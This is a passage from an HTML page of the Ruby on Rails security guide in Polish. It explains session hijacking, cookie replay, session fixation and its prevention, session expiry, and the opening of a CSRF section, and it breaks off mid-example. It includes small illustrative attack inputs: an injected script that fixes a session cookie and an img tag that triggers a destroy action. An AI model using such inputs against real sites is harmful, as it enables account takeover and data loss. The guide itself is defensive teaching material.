<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <title>Bezpieczeństwo w Ruby On Rails</title>
  <!--[if lt IE 8]>
  <script src="http://ie7-js.googlecode.com/svn/version/2.0(beta3)/IE8.js" type="text/javascript"></script>
  <![endif]-->
  <link href="stylesheets/base.css" media="screen" rel="Stylesheet" type="text/css" />
  <link href="stylesheets/forms.css" media="screen" rel="Stylesheet" type="text/css" />
  <link href="stylesheets/more.css" media="screen" rel="Stylesheet" type="text/css" />
</head>
<body>
  <div id="header" >
    <div id="logo">
      <a href="index.html" title="Ruby on Rails"><img src="images/rails_logo_remix.gif" alt="Rails" height="140" width="110" /></a>
    </div>

    <h1 id="site_title"><span>Ruby on Rails</span></h1>
    <h2 id="site_title_tagline">Sustainable productivity for web-application development</h2>

    <ul id="navMain">
      <li class="first-child"><a href="http://www.rubyonrails.org/" title="Ruby on Rails" class="ruby_on_rails">Ruby on Rails</a></li>
      <li><a class="manuals" href="index.html" title="Manuals Index">Guides Index</a></li>
    </ul>
  </div>

  <div id="container">
    
    <div id="sidebar">
      <h2>Chapters</h2>
      <ol>
          <li>
          <a href="#_wst_p">Wstęp</a>
          </li>
          <li>
          <a href="#_sesje">Sesje</a>
            <ul>
            
              <li><a href="#_czym_s_sesje">Czym są sesje?</a></li>
            
              <li><a href="#_identyfikator_sesji">Identyfikator sesji</a></li>
            
              <li><a href="#_przechwytywanie_sesji">Przechwytywanie sesji</a></li>
            
              <li><a href="#_wskaz_wki_dotycz_ce_sesji">Wskazówki dotyczące sesji</a></li>
            
              <li><a href="#_przechowywanie_sesji">Przechowywanie sesji</a></li>
            
              <li><a href="#_ataki_typu_replay_na_sesje_cookiestore">Ataki typu Replay na sesje CookieStore.</a></li>
            
              <li><a href="#_atak_typu_session_fixation">Atak typu Session fixation</a></li>
            
              <li><a href="#_sposoby_obrony_przed_atakiem_typu_session_fixation">Sposoby obrony przed atakiem typu session fixation</a></li>
            
              <li><a href="#_wygasanie_sesji">Wygasanie sesji</a></li>
            
            </ul>
          </li>
          <li>
          <a href="#_cross_site_reference_forgery_csrf">Cross-Site Reference Forgery (CSRF)</a>
            <ul>
            
              <li><a href="#_sposoby_ochrony_przed_atakiem_typu_csrf">Sposoby ochrony przed atakiem typu CSRF</a></li>
            
            </ul>
          </li>
          <li>
          <a href="#_przekierowania_i_pliki">Przekierowania i pliki</a>
            <ul>
            
              <li><a href="#_przekierowania">Przekierowania</a></li>
            
              <li><a href="#_wysy_anie_upload_plik_w">Wysyłanie (upload) plików</a></li>
            
              <li><a href="#_kod_wykonywalny_we_wczytywanych_plikach">Kod wykonywalny we wczytywanych plikach</a></li>
            
              <li><a href="#_ci_ganie_plik_w">Ściąganie plików</a></li>
            
            </ul>
          </li>
          <li>
          <a href="#_ochrona_intranetu_i_panelu_administratora">Ochrona intranetu i panelu administratora</a>
            <ul>
            
              <li><a href="#_dodatkowe_rodki_ostro_no_ci">Dodatkowe środki ostrożności</a></li>
            
            </ul>
          </li>
          <li>
          <a href="#_masowe_przypisanie">Masowe przypisanie</a>
            <ul>
            
              <li><a href="#_sposoby_ochrony">Sposoby ochrony</a></li>
            
            </ul>
          </li>
          <li>
          <a href="#_zarz_dzanie_u_ytkownikami">Zarządzanie użytkownikami</a>
            <ul>
            
              <li><a href="#_ataki_typu_brute_force_na_konta_u_ytkownik_w">Ataki typu brute-force na konta użytkowników</a></li>
            
              <li><a href="#_przej_cie_konta_u_ytkownika">Przejęcie konta użytkownika</a></li>
            
              <li><a href="#_captcha">CAPTCHA</a></li>
            
              <li><a href="#_logowanie">Logowanie</a></li>
            
              <li><a href="#_dobre_has_a">Dobre hasła</a></li>
            
              <li><a href="#_wyra_enia_regularne">Wyrażenia regularne</a></li>
            
              <li><a href="#_eskalacja_przywilej_w">Eskalacja przywilejów</a></li>
            
            </ul>
          </li>
          <li>
          <a href="#_atak_typu_injection">Atak typu Injection</a>
            <ul>
            
              <li><a href="#_bia_e_listy_vs_czarne_listy">Białe listy vs Czarne listy</a></li>
            
              <li><a href="#_atak_typu_sql_injection">Atak typu SQL Injection</a></li>
            
              <li><a href="#_atak_cross_site_scripting_xss">Atak Cross-Site Scripting (XSS)</a></li>
            
              <li><a href="#_atak_typu_css_injection">Atak typu CSS Injection</a></li>
            
              <li><a href="#_atak_typu_textile_injection">Atak typu Textile Injection</a></li>
            
              <li><a href="#_atak_typu_ajax_injection">Atak typu Ajax Injection</a></li>
            
              <li><a href="#_atak_typu_rjs_injection">Atak typu RJS Injection</a></li>
            
              <li><a href="#_atak_typu_command_line_injection">Atak typu Command Line Injection</a></li>
            
              <li><a href="#_atak_typu_header_injection">Atak typu Header Injection</a></li>
            
            </ul>
          </li>
          <li>
          <a href="#_dodatkowe_informacje">Dodatkowe informacje</a>
          </li>
          <li>
          <a href="#_dziennik_zmian">Dziennik zmian</a>
          </li>
      </ol>
    </div>
    
    <div id="content">
        <h1>Bezpieczeństwo w Ruby On Rails</h1>
      <div id="preamble">
<div class="sectionbody">
<div class="paragraph"><p>Ten przewodnik opisuje częste problemy związane z bezpieczeństwem w aplikacjach internetowych i pokazuje jak ich uniknąć stosując Railsy. Jeśli masz jakiekolwiek pytania lub sugestie, wyślij wiadomość do Heiko Webers&#8217;a na maila: 42 {<em>et</em>} rorsecurity.info. Po przeczytaniu tego przewodnika powinieneś znać takie zagadnienia jak:</p></div>
<div class="ulist"><ul>
<li>
<p>
Wszystkie <span style="background-color: #fffcdb;">wyróżnione sposoby obrony</span>
</p>
</li>
<li>
<p>
Sesje w Railsach, jak są obsługiwane, co można w nich przechowywać oraz jak mogą być atakowane
</p>
</li>
<li>
<p>
Jak zwykłe odwiedzenie witryny może stać się problemem związanym z bezpieczeństwem (przez atak CSRF)
</p>
</li>
<li>
<p>
Na co musisz zwracać uwagę przy pracy z plikami oraz dostarczaniu interfejsu administracyjnego
</p>
</li>
<li>
<p>
Swoisty dla Railsów problem z masowym przypisaniem
</p>
</li>
<li>
<p>
Jak zarządzać użytkownikami: logowanie, wylogowanie i metody ataku na wszystkich poziomach
</p>
</li>
<li>
<p>
Najbardziej popularne metody ataku typu injection
</p>
</li>
</ul></div>
</div>
</div>
<h2 id="_wst_p">1. Wstęp</h2>
<div class="sectionbody">
<div class="paragraph"><p>Frameworki powstały by pomagać projektantom w tworzeniu aplikacji internetowych. Niektóre z nich mogą być pomocne także przy ochronie aplikacji przed atakami. W rzeczywistości wszystkie frameworki są tak samo bezpieczne: jeśli stosujesz je prawidłowo będziesz w stanie stworzyć bezpieczne aplikacje używając niemalże każdego z frameworków. W Ruby on Rails można znaleźć kilka helperów rozwiązujących takie problemy jak np. ataki typu injection. Z przyjemnością muszę stwierdzić, że wszystkie Railsowe aplikacje, które audytowałem miały wysoki poziom bezpieczeństwa.</p></div>
<div class="paragraph"><p>Ogólnie rzecz biorąc nie ma sposobu na zapewnienie natychmiastowej ochrony
aplikacji przed wszystkimi rodzajami ataku. Bezpieczeństwo zależy od ludzi
używających frameworka, od metody projektowania, jak również od wszystkich
składników środowiska aplikacji internetowej: bazy danych, serwera oraz
aplikacji samej w sobie (i prawdopodobnie od innych elementów).</p></div>
<div class="paragraph"><p>Gartner Group oszacowała jednak, że 75% ataków dotyczy poziomu aplikacji internetowej. Okazało się, „że spośród 300 audytowanych stron 97% było narażonych na atak”. Dzieje się tak dlatego, ponieważ aplikacje internetowe są stosunkowo łatwym celem ataku. Nawet laik bez trudu może zrozumieć ich działanie i w prosty sposób nimi manipulować.</p></div>
<div class="paragraph"><p>Zagrożenia wobec aplikacji internetowych to między innymi: przejęcie konta
użytkownika, ominięcie kontroli dostępu, czytanie lub modyfikowanie poufnych
danych, prezentacja fałszywych treści. Atakujący może również zainstalować
konia trojańskiego lub oprogramowanie rozsyłające niepożądane maile w celu
uzyskania korzyści finansowych albo w celu zniszczenia dobrego imienia firmy poprzez modyfikację cennych materiałów. Jeśli chcesz zapobiegać atakom, zminimalizować ich działanie i wyeliminować potencjalne miejsca, w których mógłby nastąpić atak, musisz najpierw w pełni zrozumieć metody ataku. I to właśnie jest celem tego przewodnika.</p></div>
<div class="paragraph"><p>W celu stworzenia i utrzymywania bezpiecznej aplikacji internetowej musisz być na bieżąco i
aktualizować wszystkie jej warstwy zgodnie z aktualnymi wymogami bezpieczeństwa, a
także poznać swoich wrogów. Żeby być na bieżąco dopisz się do odpowiednich list mailingowych, czytaj blogi i postaraj się, żeby aktualizowanie i kontrolowanie bezpieczeństwa Twojej aplikacji weszło Ci w nawyk (sprawdź w rozdziale „Dodatkowe materiały”). Ja robię to ręcznie ponieważ to najlepszy sposób, żeby znaleźć złośliwe problemy związane z bezpieczeństwem.</p></div>
</div>
<h2 id="_sesje">2. Sesje</h2>
<div class="sectionbody">
<div class="paragraph"><p>Rozważając kwestię bezpieczeństwa dobrze zwrócić uwagę na sesje, które mogą być szczególnie narażone na ataki.</p></div>
<h3 id="_czym_s_sesje">2.1. Czym są sesje?</h3>
<div class="paragraph"><p>-- <em>HTTP jest protokołem bezstanowym. Sesje to zmieniają.</em></p></div>
<div class="paragraph"><p>Większość aplikacji wymaga śledzenia stanu danego użytkownika. Może to dotyczyć zawartości koszyka zakupów lub ID aktualnie zalogowanego użytkownika. Gdyby nie sesje, użytkownik musiałby identyfikować się i uwierzytelniać przy każdej podejmowanej akcji.
Railsy tworzą nową sesję automatycznie, w chwili gdy użytkownik zaczyna korzystać z  nowej aplikacji. W przypadku gdy użytkownik korzystał już z aplikacji, wczytywana jest istniejąca sesja.</p></div>
<div class="paragraph"><p>Sesja zwykle składa się z tablicy asocjacyjnej i identyfikatora sesji. Zwykle
jest to 32-znakowy łańcuch identyfikujący tę tablicę. Każde cookie wysłane do
przeglądarki klienta zawiera identyfikator sesji. I odwrotnie: przeglądarka
wysyła je do serwera, z każdym żądaniem klienta. W Railsach można zapisać i
pobrać wartości używając metody <tt>session</tt>:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>session<span style="color: #990000">[:</span>user_id<span style="color: #990000">]</span> <span style="color: #990000">=</span> <span style="color: #009900">@current_user</span><span style="color: #990000">.</span>id
User<span style="color: #990000">.</span>find<span style="color: #990000">(</span>session<span style="color: #990000">[:</span>user_id<span style="color: #990000">])</span></tt></pre></div></div>
<h3 id="_identyfikator_sesji">2.2. Identyfikator sesji</h3>
<div class="paragraph"><p>-- <em>Identyfikator sesji jest 32 bajtową wartością skrótu MD5.</em></p></div>
<div class="paragraph"><p>Identyfikator sesji jest wartością funkcji skrótu losowego łańcucha znaków.
Losowy łańcuch znaków generowany jest na podstawie aktualnego czasu, losowej liczba pomiędzy 0 a 1, id procesu
interpretera Ruby (jest to również wartość losowa) oraz stałego łańcucha
znaków. Obecnie atak typu brute-force na ID sesji w Railsach jest
niewykonywalny. Do tej pory MD5 pozostał nieskompromitowany (ang.
<em>uncompromised</em>), jednak znaleziono sposób na generowanie kolizji. Zatem
teoretycznie możliwe jest wygenerowanie różnych danych wejściowych które będą
miały identyczną funkcję skrótu. Jednak obecnie nie ma to żadnego wpływu na
bezpieczeństwo aplikacji railsowych (w ogólnym przypadku jest to poważny problem
bezpieczeństwa, warto zapoznać się z
<a href="http://en.wikipedia.org/wiki/Md5#Vulnerability">artykułem na ten temat w Wikipedii</a> -
przyp. red.).</p></div>
<h3 id="_przechwytywanie_sesji">2.3. Przechwytywanie sesji</h3>
<div class="paragraph"><p>-- <em>Kradzież identyfikatora sesji użytkownika umożliwia atakującemu dostęp do danej aplikacji internetowej, tak, jakby korzystał z niej pełnoprawny użytkownik.</em></p></div>
<div class="paragraph"><p>Wiele aplikacji internetowych ma następujący system uwierzytelniania:
użytkownik wprowadza nazwę użytkownika i hasło, aplikacja sprawdza dane i
przechowuje identyfikator sprawdzonego użytkownika w tablicy asocjacyjnej
sesji. Od tej chwili sesja jest ważna. Na każde żądanie aplikacja wczyta
użytkownika o danym identyfikatorze bez potrzeby uwierzytelniania.
Identyfikator sesji w cookie jednoznacznie identyfikuje sesję użytkownika.</p></div>
<div class="paragraph"><p>Stąd wynika, że cookies są wykorzystwane do tymczasowego uwierzytelniania w aplikacjach internetowych. Każdy kto przejmie czyjeś cookies, może używać aplikacji jako ten użytkownik - co może powodować poważne konsekwencje. Oto kilka sposobów na przejęcie sesji i sposoby obrony przed atakiem:</p></div>
<div class="ulist"><ul>
<li>
<p>
Wywęszenie cookies w niezabezpieczonej sieci. Bezprzewodowa sieć może posłużyć jako przykład takiej sieci. W nieszyfrowanej sieci bezprzewodowej śledzenie ruchu wszystkich podłączonych klientów jest szczególnie łatwe. Jest to jeden z powodów, dla których powinniśy zrezygnować z pracy w kawiarniach. Dla projektantów aplikacji internetowych oznacza to <span style="background-color: #fffcdb;">konieczność zapewnienia bezpiecznego połączenia przez SSL</span>.
</p>
</li>
<li>
<p>
Większość ludzi nie kasuje cookies po pracy na publicznym sprzęcie. Więc jeśli ostatni użytkownik nie wylogował się z aplikacji internetowej, ktoś inny może się pod niego podszywać. Dlatego ważne jest, aby zapewnić użytkownikowi <span style="background-color: #fffcdb;">widoczny przycisk do wylogowania</span>.
</p>
</li>
<li>
<p>
Wiele ataków typu cross-site scripting (XSS) ma na celu pozyskanie cookies użytkownika. Więcej informacji o atakach typu XSS znajduje się w dalszej części podręcznika.
</p>
</li>
<li>
<p>
Atakujący może spreparować ID sesji użytkownika zamiast kradzieży nieznanych cookies. Więcej informacji o atakach typu session fixation znajduje się w dalszej części podręcznika.
</p>
</li>
</ul></div>
<div class="paragraph"><p>Głównym celem większości atakujących jest korzyść finansowa. Ceny za skradzione loginy do kont bankowych na czarnym rynku są wyceniane od 10 do 1000 dolarów (w zależności od środków na koncie). Numery kart kredytowych są warte od 0,40 do 20 dolarów. Za konta na stronach z aukcjami online – 1 do 8 dolarów. Hasła do kont mailowych kosztują od 4 do 30 dolarów. Dane pochodzą ze strony: <a href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf">Symantec Global Internet Security Threat Report</a>.</p></div>
<h3 id="_wskaz_wki_dotycz_ce_sesji">2.4. Wskazówki dotyczące sesji</h3>
<div class="paragraph"><p>-- <em>Kilka ogólnych wskazówek dotyczących sesji.</em></p></div>
<div class="ulist"><ul>
<li>
<p>
Nie przechowuj dużych obiektów w sesji. Zamiast tego powinieneś przechowywać
  je w bazie danych i zapisywać ich ID w sesji. Rozwiążesz w ten sposób
  problemy z synchronizacją (modelu danych - przyp. red.) i nie zapełnisz
  miejsca w sesji (w zależności od tego jaką wybrałeś metodę jej
  przechowywania, patrz poniżej).
</p>
</li>
<li>
<p>
<span style="background-color: #fffcdb;">Ważne dane nie powinny być przechowywane w sesjach</span>. Gdy
  użytkownik wyczyści cookies albo zamknie przeglądarkę nie będzie mógł ich
  odzyskać. A wybierając metodę przechowywania sesji po stronie użytkownika,
  pozwolisz mu na ich odczytanie.
</p>
</li>
</ul></div>
<h3 id="_przechowywanie_sesji">2.5. Przechowywanie sesji</h3>
<div class="paragraph"><p>-- <em>Railsy zapewniają kilka mechanizmów przechowywania identyfikatorów sesji.
  Najważniejszymi z nich są ActiveRecordStore i CookieStore.</em></p></div>
<div class="paragraph"><p>Istnieje kilka sposobów przechowywania sesji, tj. miejsc w których Railsy
zapisują dane sesji i jej identyfikator. Większość aplikacji typu Real-live
korzysta z ActiveRecordStore (lub jej pochodnych). ActiveRecordStore
przechowuje dane i identyfikator sesji w tabeli w bazie danych. Dane są
zapisywane i wczytywane przy każdym żądaniu.</p></div>
<div class="paragraph"><p>W Railsach 2 wprowadzono nowy domyślny sposób przechowywania sesji -
CookieStore. CookieStore zapisuje dane sesji bezpośrednio w cookie po stronie
klienta, skąd wczytywane są przez serwer. Dzięki temu id sesji staje się
zbędne, a aplikacja działa dużo szybciej. Jednak jest to dość kontrowersyjny
sposób przechowywania i trzeba wziąć pod uwagę kilka kwestii związanych z
bezpieczeństwem tego rozwiązania:</p></div>
<div class="ulist"><ul>
<li>
<p>
Rozmiar cookies nie może przekraczać 4K. Nie stanowi to większego problemu,
  jednak nie powinno się przechowywać w cookies dużej ilości danych, odwołując
  się do tego co napisałem wcześniej. <span style="background-color: #fffcdb;">Przechowywanie np.
  bazodanowego identyfikatora zalogowanego użytkownika jest zazwyczaj ok</span>.
</p>
</li>
<li>
<p>
Użytkownik może zobaczyć wszystko co przechowujesz w sesji, ponieważ
  przechowywane dane są w postaci tekstowej (właściwie są one zakodowane w
  Base64, ale nie szyfrowane). Więc zapewne <span style="background-color: #fffcdb;">nie chciałbyś
  przechowywać tu żadnych sekretnych danych</span>. Żeby zapobiec manipulacji
  danymi sesji, wyliczany jest skrót na podstawie danych sesji oraz tajnego
  klucza po stronie serwera i umieszczany na końcu pliku cookie.
</p>
</li>
</ul></div>
<div class="paragraph"><p>Oznacza to, że bezpieczeństwo przechowywania jest zależne od tajnego klucza (i
od algorytmu funkcji skrótu, którym domyślnie jest, jak do tej pory
nieskompromitowany, SHA512). Więc <span style="background-color: #fffcdb;">nie używaj prostych kluczy takich
jak słowa ze słownika oraz kluczy poniżej 30 znaków</span>. Umieść swój tajny klucz w environment.rb:</p></div>
<div class="literalblock">
<div class="content">
<pre><tt>config.action_controller.session = {
  :key         =&gt; ‘_app_session’,
  :secret      =&gt; ‘0x0dkfj3927dkc7djdh36rkckdfzsg...’
}</tt></pre>
</div></div>
<div class="paragraph"><p>Istnieją jednak, pochodne CookieStore które szyfrują dane sesji, więc klient
nie może ich odczytać.</p></div>
<h3 id="_ataki_typu_replay_na_sesje_cookiestore">2.6. Ataki typu Replay na sesje CookieStore.</h3>
<div class="paragraph"><p>-- <em>Kolejnym sposobem ataku, którego powinieneś się obawiać gdy używasz CookieStore, jest atak typu replay.</em></p></div>
<div class="paragraph"><p>Wygląda on tak:</p></div>
<div class="ulist"><ul>
<li>
<p>
Użytkownik otrzymuje kredyty, kwota jest przechowywana w sesji (co jest złym pomysłem, ale użyłem tego przykładu dla celów demonstracyjnych).
</p>
</li>
<li>
<p>
Użytkownik kupuje jakiś przedmiot.
</p>
</li>
<li>
<p>
Jego nowy, niższy kredyt będzie przechowywany w sesji.
</p>
</li>
<li>
<p>
Ciemna strona mocy użytkownika każe mu wziąć cookie z pierwszego kroku (które wcześniej skopiował) i zastąpić obecne cookie w przeglądarce.
</p>
</li>
<li>
<p>
Użytkownik ma swój kredyt z powrotem.
</p>
</li>
</ul></div>
<div class="paragraph"><p>Zastosowanie tokena (ang. <em>nonce</em>, jednorazowa, losowa wartość - przyp. red.) w sesji rozwiązuje problem ataku
typu replay. Token jest ważny tylko raz i serwer musi śledzić wszystkie ważne
tokeny. To staje się jeszcze bardziej skomplikowane, jeśli twoja aplikacja
działa na kilku serwerach aplikacji (np. kilku instancjach Mongrela).
Przechowywanie tokena w tabeli bazy danych niszczy całą ideę CookieStore (unikanie łączenia się z bazą danych).</p></div>
<div class="paragraph"><p>Najlepszym <span style="background-color: #fffcdb;">rozwiązaniem jest przechowywanie tego rodzaju danych nie
w sesji, lecz w bazie danych</span>. W tym przypadku kredyt powinien być
przechowywany w bazie danych, a identyfikator zalogowanego użytkownika w sesji.</p></div>
<h3 id="_atak_typu_session_fixation">2.7. Atak typu Session fixation</h3>
<div class="paragraph"><p>-- <em>Oprócz kradzieży identyfikatora sesji użytkownika, atakujący może
  spreparować identyfikator sesji dla użytkownika. Zjawisko to jest określane
  mianem ataku typu session fixation</em>.</p></div>
<div class="imageblock">
<div class="content">
<img src="images/session_fixation.png" alt="Session fixation" title="Session fixation"/>
</div>
</div>
<div class="paragraph"><p>Ten atak skupia się na spreparowaniu identyfikatora sesji dla użytkownika,
który jest znany atakującemu i zmuszeniu użytkownika do korzystania z tego identyfikatora. Zatem atakujący nie musi później kraść identyfikatora sesji. Oto jak działa ten atak:</p></div>
<div class="olist arabic"><ol class="arabic">
<li>
<p>
Atakujący tworzy ważny identyfikator sesji: Ładuje stronę logowania aplikacji internetowej (która ma być obiektem ataku typu session fixation) i pozyskuje identyfikator sesji, wysłany w odpowiedzi z serwera w pliku cookie (patrz nr 1 i 2 na obrazku).
</p>
</li>
<li>
<p>
Atakujący prawdopodobnie będzie kontynuował sesję. Wygasanie sesji, na
  przykład po 20 minutach, znacznie skraca czas przewidziany na atak. Dlatego atakujący co jakiś czas otwiera aplikację internetową, żeby podtrzymać sesję.
</p>
</li>
<li>
<p>
Teraz atakujący może zmusić przeglądarkę użytkownika do korzystania z jego
  identyfikatora sesji (patrz nr 3 na obrazku). Ponieważ nie można zmienić
  cookie innej domeny (z powodu zasady tożsamego pochodzenia - ang. <em>same origin
  policy</em>), atakujący musi uruchomić JavaScript z domeny docelowej aplikacji
  internetowej. Wstrzyknięcie (an.g <em>injection</em>) własnego kodu JavaScript do aplikacji będącej obiektem ataku jest możliwe dzięki metodom takim jak XSS. Oto przykład:
<tt>&lt;script&gt; document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9"; &lt;/script&gt;</tt>.
Więcej informacji o atakach typu XSS i Injection znajduje się w dalszej części podręcznika.
</p>
</li>
<li>
<p>
Atakujący wabi ofiary do stron zainfekowanych kodem JavaScript. Przeglądając stronę, przeglądarka ofiary zmienia identyfikator sesji na identyfikator sesji-pułapki.
</p>
</li>
<li>
<p>
Ponieważ nowa sesja-pułapka nie była do tej pory używana (tzn. w ramach tej
  sesji atakujący nie logował się na konto - przyp. red.), aplikacja internetowa będzie wymagać uwierzytelnienia użytkownika.
</p>
</li>
<li>
<p>
Od tej pory, ofiara i atakujący będą wspólnie używać aplikacji internetowej, korzystając z tej samej sesji: Sesja stała się ważna, a ofiara nie zauważyła ataku.
</p>
</li>
</ol></div>
<h3 id="_sposoby_obrony_przed_atakiem_typu_session_fixation">2.8. Sposoby obrony przed atakiem typu session fixation</h3>
<div class="paragraph"><p>-- <em>Jedna linia kodu może ochronić Cię przed atakiem typu session fixation.</em></p></div>
<div class="paragraph"><p>Najskuteczniejszą ochroną jest <span style="background-color: #fffcdb;">wydanie nowego identyfikatora sesji</span>
i unieważnienie starego po udanym logowaniu. W ten sposób atakujący nie może używać spreparowanych identyfikatorów sesji. Jest to również dobry sposób obrony przeciw przejęciu sesji. Oto jak utworzyć nową sesję w Railsach:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>reset_session</tt></pre></div></div>
<div class="paragraph"><p>W przypadku korzystania z popularnej wtyczki RestfulAuthentication do
zarządzania użytkownikami, należy dodać <tt>reset_session</tt> do akcji
<tt>SessionsController#create</tt>. Zwróć uwagę, że ta akcja usuwa wszystkie wartości z sesji, <span style="background-color: #fffcdb;"> więc musisz przenieść je do nowej sesji</span>.</p></div>
<div class="paragraph"><p>Innym sposobem obrony jest <span style="background-color: #fffcdb;">zapisywanie specyficznych właściwości użytkownika w sesji,</span> weryfikowanie ich przy każdym żądaniu i odmowa dostępu, jeśli informacje te nie pasują do siebie. Takimi właściwościami mogą być adres IP lub nazwa przeglądarki internetowej, choć ta ostatnia nie jest aż tak bardzo charakterystyczna dla użytkownika. Podczas zapisywania adresu IP, musisz pamiętać, że istnieją dostawcy usług internetowych oraz duże organizacje, które oferują swoim użytkownikom dostęp do Internetu przez proxy. <span style="background-color: #fffcdb;"> Adresy IP tych użytkowników mogą ulegać zmianom w trakcie sesji,</span> więc nie będą oni mogli korzystać z aplikacji, lub tylko w ograniczonym zakresie.</p></div>
<h3 id="_wygasanie_sesji">2.9. Wygasanie sesji</h3>
<div class="paragraph"><p><em>Sesja, która nigdy nie wygasa daje więcej czasu atakującym na przeprowadzenie ataku typu cross-site reference forgery (CSRF), przechwytywanie sesji i session fixation.</em></p></div>
<div class="paragraph"><p>Jedną z możliwości jest ustawienie czasu wygaśnięcia cookie przechowującego id
sesji. Jednak klient może edytować pliki cookies, które są przechowywane w
przeglądarce internetowej, zatem sesje przechowywane po stronie serwera są
bezpieczniejsze. Oto przykład, jak <span style="background-color: #fffcdb;">ustawić wygasanie sesji w tabeli
bazy danych</span>. <tt>Session.sweep("20m")</tt> powoduje wygaśnięcie sesji, które były
używane dawniej niż 20 minut temu.</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">class</span></span> Session <span style="color: #990000">&lt;</span> ActiveRecord<span style="color: #990000">::</span>Base
 <span style="font-weight: bold"><span style="color: #0000FF">def</span></span> <span style="font-weight: bold"><span style="color: #0000FF">self</span></span><span style="color: #990000">.</span>sweep<span style="color: #990000">(</span>time_ago <span style="color: #990000">=</span> <span style="font-weight: bold"><span style="color: #0000FF">nil</span></span><span style="color: #990000">)</span>
     time <span style="color: #990000">=</span> <span style="font-weight: bold"><span style="color: #0000FF">case</span></span> time_ago
       <span style="font-weight: bold"><span style="color: #0000FF">when</span></span> <span style="color: #FF6600">/^(\d+)m$/</span> <span style="font-weight: bold"><span style="color: #0000FF">then</span></span> Time<span style="color: #990000">.</span>now <span style="color: #990000">-</span> <span style="color: #009900">$1</span><span style="color: #990000">.</span>to_i<span style="color: #990000">.</span>minute
       <span style="font-weight: bold"><span style="color: #0000FF">when</span></span> <span style="color: #FF6600">/^(\d+)h$/</span> <span style="font-weight: bold"><span style="color: #0000FF">then</span></span> Time<span style="color: #990000">.</span>now <span style="color: #990000">-</span> <span style="color: #009900">$1</span><span style="color: #990000">.</span>to_i<span style="color: #990000">.</span>hour
       <span style="font-weight: bold"><span style="color: #0000FF">when</span></span> <span style="color: #FF6600">/^(\d+)d$/</span> <span style="font-weight: bold"><span style="color: #0000FF">then</span></span> Time<span style="color: #990000">.</span>now <span style="color: #990000">-</span> <span style="color: #009900">$1</span><span style="color: #990000">.</span>to_i<span style="color: #990000">.</span>day
       <span style="font-weight: bold"><span style="color: #0000FF">else</span></span> Time<span style="color: #990000">.</span>now <span style="color: #990000">-</span> <span style="color: #993399">1</span><span style="color: #990000">.</span>hour
     <span style="font-weight: bold"><span style="color: #0000FF">end</span></span>
     <span style="font-weight: bold"><span style="color: #0000FF">self</span></span><span style="color: #990000">.</span>delete_all <span style="color: #FF0000">"updated_at &lt; '#{time.to_s(:db)}'"</span>
   <span style="font-weight: bold"><span style="color: #0000FF">end</span></span>
 <span style="font-weight: bold"><span style="color: #0000FF">end</span></span></tt></pre></div></div>
<div class="paragraph"><p>W sekcji na temat ataku typu session fixation zapoznałeś się z problemem
utrzymania sesji. Atakujący odświeżając sesję co pięć minut jest w stanie bez
końca utrzymywać sesję przy życiu, mimo tego, że sesja użytkownika już
wygasła. Prostym rozwiązaniem tego problemu może być dodanie kolumny
<tt>created_at</tt> do tabeli sesji. W ten sposób możesz usunąć sesje, które zostały stworzone dawno temu. Dodaj tą linię kodu, do metody, którą opisałem powyżej:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">self</span></span><span style="color: #990000">.</span>delete_all <span style="color: #FF0000">"updated_at &lt; '#{time.to_s(:db)}' OR created_at &lt; '#{2.days.ago.to_s(:db)}'"</span></tt></pre></div></div>
</div>
<h2 id="_cross_site_reference_forgery_csrf">3. Cross-Site Reference Forgery (CSRF)</h2>
<div class="sectionbody">
<div class="paragraph"><p>-- <em>Ta metoda ataku dodaje złośliwy kod lub link na stronie internetowej,
  która jest odpowiedzialna za dostęp do aplikacji, przy założeniu, że
  użytkownik był wcześniej uwierzytelniony. Jeśli sesja dla tej aplikacji nie wygasła,
  atakujący może bezprawnie wykonywać polecenia.</em></p></div>
<div class="imageblock">
<div class="content">
<img src="images/csrf.png" alt="CSRF" title="CSRF"/>
</div>
</div>
<div class="paragraph"><p>W rozdziale o sesjach dowiedziałeś się, że większość aplikacji railsowych
wykorzystuje sesje oparte na cookies. Albo identyfikator sesji przechowywany
jest w cookie, a dane sesji trzymane są po stronie serwera, albo dane sesji
również przechowywane są po stronie klienta. We obu przypadkach przeglądarka
z każdym żądaniem automatycznie przesyła cookie z danej domeny, oczywiście jeśli
takowe cookie istniej. Zagrożeniem może być fakt, że przeglądarka będzie
również wysyłać plik cookie, jeśli żądanie przyjdzie ze strony w innej domenie. Zacznijmy od przykładu:</p></div>
<div class="ulist"><ul>
<li>
<p>
Bob przegląda forum i widzi wpis hakera, zawierający spreparowany element
  HTML typu <tt>img</tt> (obrazek). Element jednak odnosi się do komendy w aplikacji zarządzania projektem Boba, zamiast obrazka.
</p>
</li>
<li>
<p>
<tt>&lt;img src="http://www.webapp.com/project/1/destroy"&gt;</tt>
</p>
</li>
<li>
<p>
Sesja Boba na <tt>www.webapp.com</tt> jest wciąż aktywna, bo nie wylogował się kilka minut temu.
</p>
</li>
<li>
<p>
Poprzez oglądanie wpisu, przeglądarka znajdzie tag obrazka. Następnie
  spróbuje wczytać podejrzany obrazek z <tt>www.webapp.com</tt>. Zgodnie z tym, co napisałem wcześniej, przeglądarka prześle również cookie z ważnym identyfikator sesji.
</p>
</li>
<li>
<p>
Aplikacja internetowa na <tt>www.webapp.com</tt> sprawdzi informacje o użytkowniku
